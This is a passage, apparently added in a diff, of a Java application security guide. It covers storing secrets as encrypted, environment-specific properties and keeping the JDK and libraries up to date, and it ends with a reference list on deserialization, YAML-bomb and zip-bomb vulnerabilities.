+Source: [ZipBombDeserializer.java](https://github.com/ionutbalosin/java-application-security-practices/blob/main/serialization-deserialization/src/main/java/ionutbalosin/training/application/security/practices/serialization/deserialization/zip/ZipBombDeserializer.java)
+
+## Secure Configuration and Secrets Management
+All application secrets (e.g., sensitive configuration values such as API keys, database credentials, etc.) should never be stored unencrypted with the application code (i.e., in plain text). 
+Instead, the application should define them as key-value properties, and their values must be resolved and replaced during the deployment pipeline for the specific target environment.
+
+Storing any secret unencrypted (or in plain text) together with the source code makes the application vulnerable, increases the risk of attacks, and is generally not acceptable.
+
+Example of application configuration properties:
+
+```properties
+# IdP configuration properties
+spring.security.oauth2.resourceserver.opaque.introspection-uri=${INTROSPECTION_URL}
+spring.security.oauth2.resourceserver.opaque.introspection-client-id=${INTROSPECTION_CLIENT_ID}
+spring.security.oauth2.resourceserver.opaque.introspection-client-secret=${INTROSPECTION_CLIENT_SECRET}
+
+# Database configuration properties
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.datasource.url=jdbc:postgresql://my-application-${ENV}:5432/application_db
+spring.datasource.username=${DATABASE_USERNAME}
+spring.datasource.password=${DATABASE_PASSWORD}
+spring.datasource.platform=postgres
+spring.datasource.sql-script-encoding=UTF-8
+```
+
+Now, let's imagine the application is deployed to `DEV`, `SIT`, `UAT`, and `PROD` environments. Therefore, different sets of key-value properties must be made available, one for each environment.
+
+Following the [config as code](https://en.wikipedia.org/wiki/Infrastructure_as_code) approach, all environment-specific (and sensitive) properties must be stored and versioned in different environment-specific files. For example:
+
+```properties
+# DEV properties file
+ENV=dev
+INTROSPECTION_URL=http://idp.dev:9090/realms/master/protocol/openid-connect/token/introspect
+INTROSPECTION_CLIENT_ID=dev-client-id
+INTROSPECTION_CLIENT_SECRET=BQICAHhdAZtTNcAIHM7Rz12717mWM7CpWd0IGxheREGppvO+JQE90js4DpvX9ShGenTdzIXEAAAAfDB6BgkqhkiG8w0BBwagbTBrAgEAMGYGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQM/tFcSKO4zzgV3991AgEQgDlP6x29dR+L/5TpbE00PX7Onbv1z1a2YznFZMxeN4qRYRTHJyNIOpqv0fZXjn9Y1sD0mYTshwKNHpg=
+DATABASE_USERNAME=dev-db-user
+DATABASE_PASSWORD=BQICAHg2cxBsFur/NflLQ09GZpLdFqJB34koyAuTfD+zEObj8AFAE8b9eET9ew/6ja9KcbrtAAAAojCBnwYJKoZIhvcNAQcGoAGRMIGOAgEAMIGIBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDLIaoEhRurPUUt53JQIBEIBb5uF/8i/P46fIDLnc0RrhXElD7EzuYF58P3K+xKEP8O2PKSWuGENA83fEtQSovk84TcybEcpPRuJhoTQxW5v8RT2BLGdDHVag7NQ9zX/wt+g+iBIDUidOtEpUFg==
+```
+
+Similar properties files will be created for other environments such as `SIT`, `UAT`, and `PROD`, usually by DevOps or developers.
+
+As illustrated in the example, the crucial thing is that all the secrets (e.g., `INTROSPECTION_CLIENT_SECRET`, `DATABASE_PASSWORD`) are encrypted. 
+Therefore, even if they are seen by unauthorized users, their real values cannot be decoded without the decryption key. 
+The decryption key should only be accessible in the specific environment (e.g., `DEV`, `SIT`, `UAT`, and `PROD`) and not available to unauthorized individuals.
+
+All sensitive and encrypted properties should be decrypted during deployment using the decryption keys available in the environment, as highlighted in the diagram below. For example, if using an AWS account, Amazon Key Management Service (KMS) can be used to store and manage both the encryption and decryption keys.
+The implementation details at the infrastructure level, including generating, storing, and rotating the keys, as well as encrypting and decrypting the secrets, are beyond the scope of this article.
+
+[![Secure Configuration and Secrets Management.svg](images/secure_configuration_and_secrets_management.svg)](images/secure_configuration_and_secrets_management.svg)
+
+In closing, avoid storing secrets in plain text as unencrypted values next to the code.
+
+## Keeping JDK Versions and Libraries Up to Date
+
+Regularly updating your JDK and all library dependencies is crucial for maintaining security. New versions often include important security patches and enhancements that protect against vulnerabilities.
+
+Unless there are specific cases where this cannot be achieved (especially with legacy systems that use libraries for which patches are no longer available - unfortunately, there are many such systems), this should never be neglected. Sometimes, just bumping up the minor version of these libraries is very cheap and easy to do.
+
+Ensure that your development environment and dependencies are always up to date to minimize security risks. While this may sound simple, it is often overlooked by software developers.
+
+## References
+
+- [Java Application Security Practices](https://github.com/ionutbalosin/java-application-security-practices) - GitHub source code 💻
+- [Application Security for Java Developers](https://ionutbalosin.com/training/application-security-for-java-developers-course) - Course 🎓
+- [Serialization and deserialization in Java: explaining the Java deserialize vulnerability](https://snyk.io/blog/serialization-and-deserialization-in-java/)
+- [Explaining Java Deserialization Vulnerabilities (Part 1)](https://foojay.io/today/explaining-java-deserialization-vulnerabilities-part-1/)
+- [Explaining Java Deserialization Vulnerabilities (Part 2)](https://foojay.io/today/explaining-java-deserialization-vulnerabilities-part-2/)
+- [Yaml Bomb](https://github.com/dubniczky/Yaml-Bomb)
+- [Preventing YAML parsing vulnerabilities with snakeyaml in Java](https://snyk.io/blog/java-yaml-parser-with-snakeyaml)
+- [A better zip bomb](https://www.bamsoftware.com/hacks/zipbomb)
+- [42 zip](https://unforgettable.dk/)
+
